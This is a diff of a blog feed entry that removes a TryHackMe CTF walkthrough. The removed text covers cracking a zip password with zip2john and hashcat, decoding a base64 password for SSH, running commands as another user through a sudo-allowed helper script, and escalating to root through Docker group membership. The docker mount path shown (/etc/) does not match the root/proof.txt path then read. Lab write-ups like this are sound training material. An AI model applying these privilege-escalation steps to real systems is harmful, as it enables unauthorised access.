-ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Using zip2john I was able to generate the password hash. I extracted the hash from the ziphash output and put in to a new file called newzip. and used the hashcat to crack: hashcat -m 17200 newzip /usr/share/wordlists/rockyou.txt –force&lt;/p&gt;
-
-&lt;p&gt;The password cracked successfully, I used the password to unzip the file and got source_code.php. Within the source code was a base64 encoded password.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/ChillHack]
-└──╼ $echo IWQwbnRLbjB3bREDACTED | base64 -d
-&amp;lt;hidden&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I decoded the hash and tried to login using SSH. I was successful with the user anurodh.&lt;/p&gt;
-
-&lt;p&gt;Once on the machine I did ‘sudo -l’ to check if there was a quick win to priv esc. I also checked the users home directory for the user flag, however it was not there.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;anurodh@ubuntu:/dev/shm$ sudo -l
-Matching Defaults entries for anurodh on ubuntu:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User anurodh may run the following commands on ubuntu:
-    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;No priv esc to root however I could run a script owned by apaar.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;anurodh@ubuntu:/$ sudo -u apaar /home/apaar/.helpline.sh
-
-Welcome to helpdesk. Feel free to talk to anyone at any time!
-
-Enter the person whom you want to talk with: aurick   
-Hello user! I am aurick,  Please enter your message: id    
-uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
-Thank you for your precious time!
-anurodh@ubuntu:/$ sudo -u apaar /home/apaar/.helpline.sh
-
-Welcome to helpdesk. Feel free to talk to anyone at any time!
-
-Enter the person whom you want to talk with: aurick
-Hello user! I am aurick,  Please enter your message: cat /home/apaar/local.txt
-{USER-FLAG: e8vpd3323cfvlp0qpxxx9qREDACTED}
-Thank you for your precious time!
-anurodh@ubuntu:/$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I was able to run commands as apaar, when I first got a foot hold one the machine I found a local.txt file in apaar’s home directory but was unable to read it. However now I can run commands as the apaar user so I used cat to read the file and got the user flag.&lt;/p&gt;
-
-&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
-
-&lt;p&gt;I did some enumeration using the apaar user by using the helpline.sh script and the command ‘bash -i’ to get shell on the box as the apaar user however I didnt find much so I went back to the anurodh user and ran linpeas.&lt;/p&gt;
-
-&lt;p&gt;anurodh is a memeber of the docker group, this &lt;a href=&quot;https://www.hackingarticles.in/docker-privilege-escalation/&quot;&gt;blog&lt;/a&gt; details how a machine can be exploited via docker.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;anurodh@ubuntu:/dev/shm$ docker images
-REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
-alpine              latest              a24bb4013296        6 months ago        5.57MB
-hello-world         latest              bf756fb1ae65        11 months ago       13.3kB
-anurodh@ubuntu:/dev/shm$ docker run -v /etc/:/mnt -it alpine
-/ # cd /mnt
-/mnt # cd root
-/mnt/root # cat proof.txt 
-
-
-                                        {ROOT-FLAG: w18gfpn9xehsgd3tovhREDACTED}
-
-
-Congratulations! You have successfully completed the challenge.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Thats root! Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry></feed>
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry></feed>
